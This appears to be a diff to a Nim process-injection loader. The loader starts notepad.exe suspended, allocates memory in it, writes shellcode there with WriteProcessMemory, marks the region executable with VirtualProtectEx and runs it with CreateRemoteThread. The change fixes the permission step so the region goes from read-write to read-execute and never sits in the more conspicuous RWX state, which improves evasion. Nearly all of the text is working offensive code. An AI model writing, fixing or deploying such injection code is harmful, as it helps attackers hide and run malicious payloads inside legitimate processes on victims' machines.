@@ -3,8 +3,8 @@
 
   - Launches notepad.exe in a suspended state
   - Gets a handle to the new process and allocates memory for the shellcode
-  - Writes shellcode to the allocated memory
-  - Change permissions back to RX in the allocated memory (not currently working)
+  - WriteProcessMemory to write shellcode to the allocated memory
+  - VirtualProtectEx to make the memory region executable
   - CreateRemoteThread at shellcode location to launch the shellcode
 
 ]#
@@ -25,7 +25,7 @@ proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =
 
   echo "[*] pHandle: ", pHandle
 
-  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
+  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READWRITE)
 
   var bytesWritten: SIZE_T
   let wSuccess = WriteProcessMemory(pHandle, rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len),addr bytesWritten)
@@ -34,12 +34,8 @@ proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =
   echo "    \\-- bytes written: ", bytesWritten
   echo ""
 
-  var consoleInput = readLine(stdin);
-
   var oldProtect: DWORD
-
-  # This isn't currently changing the page permissions correctly, need to investigate
-  let protSuccess = VirtualProtect(cast[LPVOID](rPtr), shellcode.len, PAGE_EXECUTE_READ, addr oldProtect)
+  let protSuccess = VirtualProtectEx(pHandle, cast[LPVOID](rPtr), shellcode.len, PAGE_EXECUTE_READ, addr oldProtect)
 
   echo "[*] VirtualProtect: ", bool(protSuccess)
   echo "    \\-- Changed memory protection back to RX instead of RWX"
